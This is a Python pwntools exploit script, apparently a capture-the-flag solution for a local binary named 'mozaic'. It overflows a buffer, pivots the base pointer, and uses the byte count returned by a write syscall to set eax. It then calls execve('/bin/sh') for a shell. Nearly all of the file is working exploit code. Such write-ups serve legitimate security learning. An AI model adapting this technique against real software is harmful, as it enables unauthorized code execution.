from pwn import *

context.arch = "amd64"
context.endian = "little"
context.word_size = 64
context.terminal = ["tmux", "splitw", "-h"]

"""
(!!!) This sol works with the provided exe, if you build the exe yourself you might need to
modify the global data
The short description is:
    We want to execve("/bin/sh"), to do that we need:
    - a way to rbp and a way to set rip
    - a place at a known address to store some strings and pointers
    - eax set to 0x3b
"""

p = process("./mozaic");

#
# if you want to play around with modifying the exe you can then modify these
# to reflect the changes
# -- start -------- global data ------------------------------------------- :
banner_p = 0x403000;
write_p = 0x40123e;
read_p = 0x40125f;
syscall3_p = 0x401243;
execve_syscall_num = 0x3b;
random_ds_address = 0x403598 + 0x10;
bannersize = 0x592
# -- end ---------- global data ------------------------------------------- :

# only used for debug
loopret = 0x4010d1;

# Breakpoint at loopret:
#   The exploit starts after this BP is hit.
# Breakpoint at write_p:
#   first stage where we set eax to 0x3b
# Breakpoint at syscall3_p:
#   second stage where we get a shell
# gdb.attach(p, f"""
# b *{hex(loopret)}
# c
# del break
# b *{hex(write_p)}
# c
# del break
# b *{hex(syscall3_p)}
# c
# c
# """)

data = b""
# -- start -------- first set of params ----------------------------------- :
g = cyclic_gen();
# string used to set eax by way of write syscall
data += g.get(0x40);
first_set_args_bytesize = 0x10
first_set_base_pointer = banner_p + 0x40 + first_set_args_bytesize;
# address of string
data += p64(banner_p);
# size to be written
data += p32(execve_syscall_num);
# filedescriptor to write to
data += p32(1);
# -- end ---------- first set of params ----------------------------------- :

# -- start -------- second set of params ---------------------------------- :
"""
 Basically here we set the memory layout so that the final syscall3 call will
spawn a shell.
 This is where we choose to jump after we set eax to 0x3b,
 [rbp-4 ] needs to have a pointer to pathname
 [rbp-8 ] needs to have a pointer to envp[], we set it to null
 [rbp-16] needs to have a pointer to argv[], the convention is to have the first entry
          in argv[] be the pathname, so we need to construct a null terminated array
          with only one element, a pointer to pathname
    401243:	8b 7d fc             	mov    edi,DWORD PTR [rbp-0x4]  | pathname
    401246:	48 8b 75 f0          	mov    rsi,QWORD PTR [rbp-0x10] |
    40124a:	8b 55 f8             	mov    edx,DWORD PTR [rbp-0x8]  |
    40124d:	0f 05                	syscall

"""
shellstring_pointer = banner_p + len(data);
# the star of the *sh*ow
data += b"/bin/sh\0";
shellstring_pointer_pointer = banner_p + len(data);
# a pointer to the string
data += p64(shellstring_pointer);
data += p64(0);
second_set_base_pointer = banner_p + len(data) + 0x10;
# the layout that will get loaded, as a side note, since the source code uses 
# unsigned integers for the parameters of the write function, we have to
# cram the pathname and envp into 64 bits, but for this binary it works.
# [rbp-16] ; the argv[] array
data += p64(shellstring_pointer_pointer);
# [rbp-8]  ; the nulled envp[] array 
data += p32(0)
# [rbp-4]  ; pathname
data += p32(shellstring_pointer);
# -- end ---------- second set of params ---------------------------------- :

# -- sanity check --------------------------------------------------------- :
if(len(data) > bannersize):
    print("data too big");
    exit(1);
# ---------------------------------------------------------------------------

g = cyclic_gen();
# some padding
payload = g.get(96);

# NOTE: maybe it is a bit forced but the exploit that i tought of relies 
# on the observation that you can load data at a known address by using
# the random "data structure" at the end of char banner[]
# 
# we want to load the execve params into some memory location, 
# we do it in the memory location where banner resides
payload += p64(random_ds_address);
payload += p64(read_p);

# we use the write syscall to set the eax value to an arbitrary value
# because we control the base pointer we can control the arguments of
# write and write returns in eax the number of bytes written.
payload += p64(first_set_base_pointer);
payload += p64(write_p);

# here we do the execve syscall
payload += p64(second_set_base_pointer)
payload += p64(syscall3_p);

# we send the payload
p.recvuntil(b"$> ");
p.sendline(payload);

p.recvuntil(b"$> ");
# after this hits the program will load the data and we 
# will have first + second data sets into banner
p.sendline(b"q");

# we get no more prompt
# we send the data that will be loaded at the memory address where the banner resides
p.sendline(data);

p.interactive();